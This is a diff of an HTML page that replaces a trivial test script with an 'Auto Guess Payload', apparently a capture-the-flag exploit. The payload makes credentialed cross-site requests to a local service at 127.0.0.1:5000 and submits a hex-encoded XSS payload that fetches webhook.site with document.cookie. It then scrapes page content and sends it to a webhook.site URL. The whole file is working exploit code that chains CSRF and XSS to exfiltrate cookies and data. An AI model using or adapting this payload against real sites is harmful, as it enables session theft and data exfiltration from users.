@@ -1,9 +1,41 @@
 <!DOCTYPE html>
-<html>
-  <body>
-    <h1>JS Test Page</h1>
-    <script>
-      fetch('https://webhook.site/b5ea932e-efd5-4d15-88bc-96f61cc8527a?leak=JS_RUNNING')
-    </script>
-  </body>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Auto Guess Payload</title>
+</head>
+<body>
+  <h2>Auto Guess Payload Running...</h2>
+  <script>
+    (async () => {
+      const webhook = 'https://webhook.site/b5ea932e-efd5-4d15-88bc-96f61cc8527a';
+
+      const noteHex = `
+3c696d67207372633d31206f6e6572726f723d22666574636828276874
+74703a2f2f776562686f6f6b2e736974652f62356561393332652d6566
+64352d346431352d383862632d3936663631636338353237613f6c6561
+6b3d272b646f63756d656e742e636f6f6b696529223e
+`.replace(/\s+/g, '');
+
+      try {
+        await fetch('http://127.0.0.1:5000/guess', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          credentials: 'include',
+          body: JSON.stringify({ guess: 'NHNC{', note: noteHex })
+        });
+
+        const res = await fetch('http://127.0.0.1:5000/inner.html', { credentials: 'include' });
+        const html = await res.text();
+
+        const prefix = (html.match(/<span id="best-prefix">(.*?)<\/span>/) || [])[1] || '(none)';
+        const note = (html.match(/<span id="note">(.*?)<\/span>/) || [])[1] || '(none)';
+
+        await fetch(`${webhook}?leak=${encodeURIComponent('prefix=' + prefix + '&note=' + note)}`);
+      } catch (e) {
+        await fetch(`${webhook}?leak=ERROR_${encodeURIComponent(e.message)}`);
+      }
+    })();
+  </script>
+</body>
 </html>
